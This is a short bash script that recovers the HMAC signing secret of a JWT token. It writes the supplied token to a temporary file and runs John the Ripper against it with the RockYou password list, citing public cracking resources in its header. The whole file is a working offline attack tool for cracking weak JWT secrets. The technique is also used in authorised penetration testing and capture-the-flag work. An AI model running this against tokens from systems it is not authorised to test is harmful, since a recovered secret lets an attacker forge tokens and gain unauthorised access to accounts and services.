#!/bin/bash
###########################################################################################
# Script to try to recover the secret of a JWT token signed with a HMAC algorithm.
# John The Ripper is used with the RockYou dictionary.
# Default token format is "HMAC-SHA256".
#
# References:
#	https://github.com/Sjord/jwtcrack
#	https://www.openwall.com/john/
#	https://github.com/openwall/john
#	https://gist.github.com/pich4ya/f76280b7a6af67a9adf740f3ee547689
#	https://github.com/danielmiessler/SecLists/tree/master/Passwords/Leaked-Databases
#	https://www.javainuse.com/jwtgenerator
#	https://jwt.io/
###########################################################################################	
if [ "$#" -lt 1 ]; then
    script_name=$(basename "$0")
    echo "Usage:"
    echo "   $script_name [JWT_TOKEN]"
    echo ""
    echo "Call example:"
    echo "    $script_name 'eyJ0eXAiOiJ...'"
    exit 1
fi
token_format="HMAC-SHA256"
token="$1"
token_file="/tmp/token.txt"
echo "$token" > $token_file
cd john/run
./john $token_file --wordlist=/work/rockyou.txt --format=$token_format